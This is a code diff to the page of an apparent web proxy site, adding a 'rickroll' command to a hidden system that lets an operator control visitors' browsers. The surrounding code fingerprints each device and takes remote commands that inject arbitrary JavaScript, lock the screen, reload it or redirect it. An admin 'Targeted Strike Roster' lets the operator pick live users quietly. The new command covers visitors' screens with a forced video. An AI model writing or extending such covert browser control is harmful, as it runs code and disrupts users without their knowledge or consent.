@@ -437,7 +437,7 @@
 
 		<footer>
 			<div><a title="License information" href="credits.html">Credits</a></div>
-			<div><span>Velarium © 2026</span></div>
+			<div><span>Velarium &copy; 2026</span></div>
 		</footer>
 
 		<div id="browser-window">
@@ -549,9 +549,7 @@
 		</div>
 
 		<script>
-			// ==========================================
 			// GUARANTEED PROXY INITIALIZATION
-			// ==========================================
 			window.isTransportReady = false;
 			window.transportPromise = null;
 
@@ -582,9 +580,7 @@
 				return window.transportPromise;
 			}
 
-			// ==========================================
 			// DEVICE SNIFFER & AGGRESSIVE HEARTBEAT
-			// ==========================================
 			let myDeviceType = "Desktop";
 			if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) myDeviceType = "iOS Device";
 			else if (/Android/i.test(navigator.userAgent)) myDeviceType = "Android";
@@ -659,9 +655,50 @@
 						else if (action === 'inject_js') {
 							executeRemoteJs(data);
 						}
+						else if (action === 'rickroll') {
+							executeRickroll();
+						}
 					});
 				}
 			});
+
+			function executeRickroll() {
+				// Prevent duplicate overlays
+				if (document.getElementById('rickroll-overlay')) return;
+
+				const spawnAndPlay = () => {
+					if (document.getElementById('rickroll-overlay')) return;
+
+					let overlay = document.createElement('div');
+					overlay.id = 'rickroll-overlay';
+					overlay.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:999999999;display:flex;align-items:center;justify-content:center;";
+
+					overlay.innerHTML = `
+						<video id="rickroll-video" playsinline style="width:100%;height:100%;object-fit:contain;">
+							<source src="rickroll.mp4#t=43" type="video/mp4">
+						</video>
+					`;
+					document.body.appendChild(overlay);
+
+					const vid = document.getElementById('rickroll-video');
+					vid.currentTime = 43;
+					vid.play();
+
+					// Reveal Close Button after exactly 5 seconds
+					setTimeout(() => {
+						if (!document.getElementById('rickroll-overlay')) return;
+
+						const closeBtn = document.createElement('button');
+						closeBtn.innerText = '✕ Close Video';
+						closeBtn.style = 'position:absolute;top:20px;right:20px;padding:12px 20px;background:#ff4b4b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;z-index:1000000000;box-shadow:0 4px 12px rgba(0,0,0,0.5);';
+						closeBtn.onclick = () => overlay.remove();
+						overlay.appendChild(closeBtn);
+					}, 5000);
+				};
+
+				// Trigger on next click if user hasn't interacted yet, otherwise play immediately
+				window.addEventListener('click', spawnAndPlay, { once: true });
+			}
 
 			function toggleFreezeOverlay(state) {
 				let freezeBox = document.getElementById('freeze-screen-overlay');
@@ -956,7 +993,7 @@
 
 					<div class="dashboard-grid">
 
-						<!-- NEW TARGETED STRIKE ROSTER -->
+						<!-- TARGETED STRIKE ROSTER -->
 						<div class="panel-section" style="grid-column: 1 / -1;">
 							<h3>Targeted Strike Roster</h3>
 							<p style="margin-bottom: 15px;">Live device tracking. Execute commands on specific users without alerting the entire network.</p>
@@ -994,6 +1031,20 @@
 									<div id="sniffer-box">Sniffer active...<br></div>
 								</div>
 							</div>
+						</div>
+
+						<!-- GLOBAL RICKROLL -->
+						<div class="panel-section">
+							<h3>Global Rickroll @ 0:43</h3>
+							<p>Force every active user's screen to overtake with your local video file, starting at 0:43.</p>
+							<button onclick="sendCmd('rickroll', null)" style="background: #e6a800; color: #111; border-color: #e6a800; margin-top: auto;">EXECUTE GLOBAL RICKROLL</button>
+						</div>
+
+						<!-- CHAOS RICKROLL (RANDOM USER) -->
+						<div class="panel-section">
+							<h3>Chaos Rickroll (Random User)</h3>
+							<p>Picks exactly 1 random active connected user and Rickrolls only them.</p>
+							<button onclick="sendRandomRickroll()" style="background: #e6a800; color: #111; border-color: #e6a800; margin-top: auto;">RICKROLL 1 RANDOM USER</button>
 						</div>
 
 						<!-- ATTENTION MODE (FREEZE) -->
@@ -1073,6 +1124,7 @@
 
 					<script>
 						const localAdminSocket = io('${serverOrigin}');
+						let activeRosterList = [];
 
 						localAdminSocket.emit('request_ping');
 
@@ -1094,6 +1146,7 @@
 
 						// Render the Live Roster with ALL targeted buttons
 						localAdminSocket.on('roster_update', (roster) => {
+							activeRosterList = roster;
 							const tbody = document.getElementById('roster-body');
 							if (roster.length === 0) {
 								tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #555;">No active connections found.</td></tr>';
@@ -1108,6 +1161,7 @@
 									<td style="font-weight: bold;">\${client.device}</td>
 									<td><span class="roster-url" title="\${client.url}">\${client.url}</span></td>
 									<td style="text-align: right; display: flex; justify-content: flex-end; gap: 3px;">
+										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'rickroll', null)" style="background: #e6a800; color: #111;" title="Targeted Rickroll @ 0:43">Roll</button>
 										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'freeze', true)" title="Lock Screen">Lck</button>
 										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'freeze', false)" title="Unlock Screen">Unl</button>
 										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'force_reload', null)" title="Force Refresh">Rld</button>
@@ -1139,7 +1193,15 @@
 							});
 						};
 
-						// Clean popup functions that don't break HTML quote escaping!
+						window.sendRandomRickroll = function() {
+							if (activeRosterList.length > 0) {
+								const randomClient = activeRosterList[Math.floor(Math.random() * activeRosterList.length)];
+								sendTargetedCmd(randomClient.id, 'rickroll', null);
+							} else {
+								alert('No active connections available to target.');
+							}
+						};
+
 						window.promptUrlAndSend = function(targetId) {
 							let url = prompt('Send user to URL:', 'https://youtube.com');
 							if(url) sendTargetedCmd(targetId, 'force_url', url);
